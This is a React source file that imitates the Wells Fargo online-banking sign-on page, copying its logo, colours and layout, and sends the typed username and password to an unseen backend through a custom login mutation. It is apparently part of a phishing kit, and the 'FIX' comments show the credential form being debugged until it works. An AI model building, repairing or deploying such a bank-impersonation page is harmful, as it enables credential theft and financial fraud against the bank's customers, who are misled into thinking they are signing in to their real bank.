import { useState } from "react";
import { X, Search, User, Eye, EyeOff } from "lucide-react";
import navlogo from "../assets/wflogo.webp";
import { useLogin } from "../hooks/mutations/useLogin";

export default function WellsFargoLogin() {
  // FIX 1: Typo — was "setFrom", corrected to "setForm"
  const [form, setForm] = useState({
    username: "",
    password: "",
  });
  const [showPassword, setShowPassword] = useState(false);
  const [saveUsername, setSaveUsername] = useState(false);

  const loginMutation = useLogin();

  // FIX 2: Added "canSignIn" derived value (was used but never defined)
  const canSignIn = form.username.trim() !== "" && form.password.trim() !== "";

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setForm((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    localStorage.setItem("loginPage", window.location.pathname);
    loginMutation.mutate({
      username: form.username,
      password: form.password,
    });
  };

  return (
    <div className="min-h-screen flex flex-col font-sans" style={{ fontFamily: "'Georgia', serif" }}>
      {/* Main Page Content */}
      <div className="flex-1 relative overflow-hidden">
        {/* Background: Warm Sunset with Flowers */}
        <div
          className="absolute inset-0"
          style={{
            background: "linear-gradient(160deg, #87CEEB 0%, #FDB97D 40%, #F4A261 65%, #E76F51 100%)",
          }}
        />
        {/* Flower Silhouettes Left */}
        <div className="absolute bottom-0 left-0 w-64 h-full pointer-events-none">
          <FlowerSilhouettes side="left" />
        </div>
        {/* Flower Silhouettes Right */}
        <div className="absolute bottom-0 right-0 w-64 h-full pointer-events-none">
          <FlowerSilhouettes side="right" />
        </div>

        {/* Wells Fargo Header */}
        <div className="relative z-10 bg-[#C41230] shadow-md">
          <div className="max-w-6xl mx-auto px-6 flex items-center justify-between h-14">
            {/* Logo */}
            <div className="flex items-center">
              <img src={navlogo} alt="Wells Fargo" />
            </div>
            {/* Nav Links */}
            <div className="flex items-center gap-6 text-white text-sm">
              <a href="#" className="flex items-center gap-1 hover:underline">
                <span className="text-base">🔒</span>
                <span>Enroll</span>
              </a>
              <a href="#" className="hover:underline">Customer Service</a>
              <a href="#" className="hover:underline">ATMs/Locations</a>
              <a href="#" className="hover:underline">Español</a>
              <div className="flex items-center bg-white rounded-full px-3 py-1 gap-1 ml-2">
                <input
                  className="bg-transparent text-gray-700 text-sm outline-none w-20 placeholder-gray-400"
                  placeholder="Search"
                />
                <Search size={15} className="text-gray-500" />
              </div>
            </div>
          </div>
          {/* Yellow accent bar */}
          <div className="h-1 bg-[#F5A623]" />
        </div>

        {/* Login Card */}
        <div className="relative z-10 flex justify-center pt-12 pb-16">
          <div className="bg-white rounded-2xl shadow-2xl px-12 py-10 w-full max-w-lg">
            <h1
              className="text-3xl text-center text-gray-800 mb-8"
              style={{ fontFamily: "'Georgia', serif", fontWeight: 400 }}
            >
              Good morning
            </h1>

            {/* Username Field */}
            <div className="relative mb-4">
              <input
                type="text"
                // FIX 3: Added name="username" so handleChange updates the correct field
                name="username"
                placeholder="Username"
                value={form.username}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded-full px-5 py-3.5 text-gray-700 text-sm outline-none focus:border-[#C41230] focus:ring-2 focus:ring-red-100 transition-all pr-12"
              />
              {form.username && (
                <button
                  // FIX 4: Was `() => ("")` (no-op). Now correctly clears the username field
                  onClick={() => setForm((prev) => ({ ...prev, username: "" }))}
                  className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  <X size={17} />
                </button>
              )}
            </div>

            {/* Password Field */}
            <div className="relative mb-5">
              <input
                type={showPassword ? "text" : "password"}
                // FIX 3: Added name="password" so handleChange updates the correct field
                name="password"
                placeholder="Password"
                value={form.password}
                onChange={handleChange}
                className="w-full border border-gray-300 rounded-full px-5 py-3.5 text-gray-700 text-sm outline-none focus:border-[#C41230] focus:ring-2 focus:ring-red-100 transition-all pr-16"
              />
              <button
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-5 top-1/2 -translate-y-1/2 text-[#C41230] text-sm font-medium hover:underline flex items-center gap-1"
              >
                {showPassword ? (
                  <>
                    <EyeOff size={14} />
                    <span>Hide</span>
                  </>
                ) : (
                  <span>Show</span>
                )}
              </button>
            </div>

            {/* Save Username Checkbox */}
            <div className="flex items-start gap-3 mb-2">
              <div
                onClick={() => setSaveUsername(!saveUsername)}
                className={`mt-0.5 w-5 h-5 flex-shrink-0 border-2 rounded cursor-pointer transition-colors ${
                  saveUsername
                    ? "bg-[#C41230] border-[#C41230]"
                    : "bg-white border-gray-400"
                }`}
              >
                {saveUsername && (
                  <svg viewBox="0 0 14 14" fill="none" className="w-full h-full p-0.5">
                    <path d="M2 7l4 4 6-6" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                )}
              </div>
              <label
                onClick={() => setSaveUsername(!saveUsername)}
                className="text-sm text-gray-700 cursor-pointer select-none"
              >
                Save username
              </label>
            </div>

            <p className="text-xs text-gray-500 mb-8 ml-8 leading-relaxed">
              To help keep your account secure, save your username only on devices
              that aren't used by other people.
            </p>

            {/* Sign On Button */}
            {/* FIX 5: Connected onClick to handleSubmit — was never wired up */}
            <button
              onClick={handleSubmit}
              disabled={!canSignIn}
              className={`w-full rounded-full py-3.5 text-sm font-semibold transition-all duration-200 mb-4 ${
                canSignIn
                  ? "bg-[#C41230] text-white hover:bg-[#a00f26] shadow-md hover:shadow-lg"
                  : "bg-gray-200 text-gray-400 cursor-not-allowed"
              }`}
            >
              Sign on
            </button>

            {/* Divider */}
            <div className="flex items-center gap-3 mb-4">
              <div className="flex-1 h-px bg-gray-200" />
              <span className="text-sm text-gray-500">or</span>
              <div className="flex-1 h-px bg-gray-200" />
            </div>

            {/* Use a Passkey Button */}
            <button className="w-full rounded-full py-3.5 border-2 border-gray-800 text-gray-800 text-sm font-semibold flex items-center justify-center gap-2 hover:bg-gray-50 transition-all">
              <User size={16} />
              Use a passkey
            </button>

            <p className="text-xs text-gray-500 text-center mt-5 leading-relaxed">
              Don't have one? Create a passkey after signing on and skip the password
              next time.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

// Simple SVG flower silhouettes for background
function FlowerSilhouettes({ side }) {
  const isLeft = side === "left";
  return (
    <svg
      viewBox="0 0 200 500"
      preserveAspectRatio="xMidYMax meet"
      className="w-full h-full"
      style={{ transform: isLeft ? "none" : "scaleX(-1)" }}
    >
      <line x1="60" y1="500" x2="60" y2="200" stroke="#1a1a1a" strokeWidth="3" />
      <line x1="100" y1="500" x2="90" y2="150" stroke="#1a1a1a" strokeWidth="3" />
      <line x1="140" y1="500" x2="150" y2="220" stroke="#1a1a1a" strokeWidth="3" />
      <line x1="30" y1="500" x2="25" y2="280" stroke="#1a1a1a" strokeWidth="2" />
      <line x1="170" y1="500" x2="175" y2="300" stroke="#1a1a1a" strokeWidth="2" />

      <Flower cx={60} cy={185} r={28} />
      <Flower cx={90} cy={130} r={35} />
      <Flower cx={150} cy={205} r={24} />
      <Flower cx={25} cy={265} r={18} />
      <Flower cx={175} cy={285} r={20} />

      <ellipse cx="75" cy="340" rx="20" ry="8" fill="#1a1a1a" transform="rotate(-30 75 340)" />
      <ellipse cx="110" cy="300" rx="18" ry="7" fill="#1a1a1a" transform="rotate(20 110 300)" />
      <ellipse cx="45" cy="390" rx="15" ry="6" fill="#1a1a1a" transform="rotate(-20 45 390)" />

      <circle cx="120" cy="260" r="6" fill="#1a1a1a" />
      <circle cx="185" cy="240" r="5" fill="#1a1a1a" />
    </svg>
  );
}

function Flower({ cx, cy, r }) {
  const petals = 8;
  return (
    <g>
      {Array.from({ length: petals }).map((_, i) => {
        const angle = (i / petals) * 2 * Math.PI;
        const px = cx + Math.cos(angle) * r * 1.4;
        const py = cy + Math.sin(angle) * r * 1.4;
        return (
          <ellipse
            key={i}
            cx={(cx + px) / 2}
            cy={(cy + py) / 2}
            rx={r * 0.55}
            ry={r * 0.28}
            fill="#1a1a1a"
            transform={`rotate(${(angle * 180) / Math.PI} ${(cx + px) / 2} ${(cy + py) / 2})`}
          />
        );
      })}
      <circle cx={cx} cy={cy} r={r * 0.45} fill="#1a1a1a" />
    </g>
  );
}